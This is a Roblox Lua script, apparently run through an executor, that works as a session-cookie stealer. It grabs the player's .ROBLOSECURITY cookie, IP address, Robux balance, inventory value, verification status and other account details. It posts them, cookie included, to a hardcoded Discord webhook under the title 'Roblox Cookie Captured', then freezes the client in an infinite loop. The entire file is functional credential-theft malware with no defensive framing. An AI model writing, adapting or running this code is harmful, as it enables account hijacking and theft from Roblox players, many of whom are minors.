local webhookURL = "https://discord.com/api/webhooks/1504249631352160409/bP-Uck5y-s8rblE2O8KhWx5Y1m6ubqLqMUu4Z2W3TS5uRFKqApfkgSlT8Rxmrz6IXejA"

local http = game:GetService("HttpService")

local function grabCookie()
    local s, r = pcall(function()
        return http:GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
    end)
    if s and r and r ~= "" then return r end
    local cookies = http:GetCookies()
    for _, c in pairs(cookies) do
        if c.Name == ".ROBLOSECURITY" then return c.Value end
    end
    return nil
end

local function getAccountInfo()
    local plr = game:GetService("Players").LocalPlayer
    if plr then
        return {
            username = plr.Name,
            displayName = plr.DisplayName,
            userId = plr.UserId,
            accountAge = plr.AccountAge
        }
    end
    return nil
end

local function getIP()
    local s, r = pcall(function()
        return http:GetAsync("https://api.ipify.org")
    end)
    if s and r then return r end
    return "Unknown"
end

local function getGameInfo()
    local s, r = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if s and r then
        return {placeName = r.Name, placeId = game.PlaceId, jobId = game.JobId}
    end
    return {placeName = "Unknown", placeId = game.PlaceId, jobId = game.JobId}
end

local function getRobux(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://economy.roblox.com/v1/users/" .. userId .. "/currency"))
    end)
    if s and r then return r.robux or 0 end
    return 0
end

local function getPremium(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership"))
    end)
    if s and r then return r.isPremium or false end
    return false
end

local function getInventoryRAP(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://inventory.roblox.com/v1/users/" .. userId .. "/assets/collectibles?limit=100&sortOrder=Desc"))
    end)
    if s and r and r.data then
        local totalRAP = 0
        for _, item in pairs(r.data) do
            if item.recentAveragePrice then totalRAP = totalRAP + item.recentAveragePrice end
        end
        return totalRAP, #r.data
    end
    return 0, 0
end

local function getEmailVerified(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://users.roblox.com/v1/users/" .. userId))
    end)
    if s and r then return r.isEmailVerified or false, r.isPhoneVerified or false end
    return false, false
end

local function getFriends(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count"))
    end)
    if s and r then return r.count or 0 end
    return 0
end

local function getBadges(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://badges.roblox.com/v1/users/" .. userId .. "/badges?limit=1"))
    end)
    if s and r then return r.total or 0 end
    return 0
end

local function getCreatedDate(userId)
    local s, r = pcall(function()
        return http:JSONDecode(http:GetAsync("https://users.roblox.com/v1/users/" .. userId))
    end)
    if s and r and r.created then
        return r.created:sub(1, 10)
    end
    return "Unknown"
end

local function getDeviceType()
    if game:GetService("UserInputService").TouchEnabled then
        return "Mobile/Tablet"
    elseif game:GetService("UserInputService").KeyboardEnabled then
        return "Windows PC"
    else
        return "Console"
    end
end

local function sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device)
    local embed = {{
        title = "Roblox Cookie Captured",
        color = 0xff0044,
        description = "━━━━━━━━━━━━━━━━━━━━━━━━",
        fields = {
            {name = "Username", value = acc.username .. " (@" .. acc.displayName .. ")", inline = true},
            {name = "User ID", value = tostring(acc.userId), inline = true},
            {name = "Created", value = created .. " (" .. acc.accountAge .. " days)", inline = true},
            {name = "Robux", value = tostring(robux) .. " R$", inline = true},
            {name = "Premium", value = premium and "Yes" or "No", inline = true},
            {name = "RAP", value = tostring(rap) .. " R$ (" .. tostring(itemCount) .. " items)", inline = true},
            {name = "Email Verified", value = emailVer and "Yes" or "No", inline = true},
            {name = "Phone Verified", value = phoneVer and "Yes" or "No", inline = true},
            {name = "Friends", value = tostring(friends), inline = true},
            {name = "Badges", value = tostring(badges), inline = true},
            {name = "IP Address", value = ip, inline = true},
            {name = "Game", value = gameInfo.placeName .. " (" .. tostring(gameInfo.placeId) .. ")", inline = true},
            {name = "Device", value = device, inline = true},
            {name = "Cookie", value = "```" .. cookie .. "```", inline = false}
        },
        footer = {text = "Script by Invincible"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
    local data = http:JSONEncode({embeds = embed, content = "||" .. cookie .. "||"})
    pcall(function() http:PostAsync(webhookURL, data, "application/json") end)
end

local cookie = grabCookie()
local acc = getAccountInfo()

if cookie and acc then
    setclipboard(cookie)
    local ip = getIP()
    local gameInfo = getGameInfo()
    local robux = getRobux(acc.userId)
    local premium = getPremium(acc.userId)
    local rap, itemCount = getInventoryRAP(acc.userId)
    local emailVer, phoneVer = getEmailVerified(acc.userId)
    local friends = getFriends(acc.userId)
    local badges = getBadges(acc.userId)
    local created = getCreatedDate(acc.userId)
    local device = getDeviceType()
    sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device)
    while true do end
end
